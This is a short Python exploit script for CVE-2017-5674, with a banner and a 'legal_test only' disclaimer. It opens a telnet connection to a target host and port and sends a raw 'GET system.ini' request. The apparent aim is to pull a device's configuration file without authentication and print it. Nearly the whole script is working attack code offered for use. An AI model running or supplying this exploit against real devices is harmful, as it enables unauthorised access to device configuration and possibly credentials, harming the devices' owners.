#!/usr/bin/python3

import os
import telnetlib
import re
import sys


class bcolors:

    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'

#print(bcolors.GREEN)

banner = """

+-------------------------------------------+
| ::::, :::::, :::::: ::  :: :::::: :::::,  |
| ::  : ::   ;   ::   ::  :: ::     ::   ;  |
| ::::' :::::'   ::   ::  :: :::::: :::::'  |
| ::    :: ::    ::   ::  :: ::     :: ::   |
| ::    ::  ;, ::::::  ',,'  :::::: ::  ;,  |
+-------------------------------------------+
[+]CVE-2017-5674
[+]Use For legal_test only
"""
usage = f"""

usage:

{sys.argv[0]} <target_host> <target_port>

example:

{sys.argv[0]} vuln.com 81


"""
print(bcolors.YELLOW)
print(banner)
print(bcolors.ENDC)

if len(sys.argv) != 3:
    
    print(bcolors.FAIL)
    print("[!]Need More Arguments")
    print(usage)
    print(bcolors.ENDC)

    sys.exit()

target_host = sys.argv[1]
target_port = sys.argv[2]

reg = re.search(r"http://|https://",target_host)

if reg != None:
    print(bcolors.RED)
    print("[!]Don't Need Protocol like a \"http://...\"")
    print(bcolors.BLUE)
    print("[-]Fix the Forms")
    print(bcolors.ENDC)
    value = len(reg.group())

    target_host = target_host[value:]

try:

    tn = telnetlib.Telnet(target_host,target_port)
    
    payload = b"GET system.ini\n"

    tn.write(payload)

    res = tn.read_all().decode('ascii')
    
    print(bcolors.GREEN)
    print(res)
    print(bcolors.ENDC)

except:

    print(bcolors.FAIL)
    print("[!]Some Issue Occured")
    print(bcolors.ENDC)
    sys.exit()
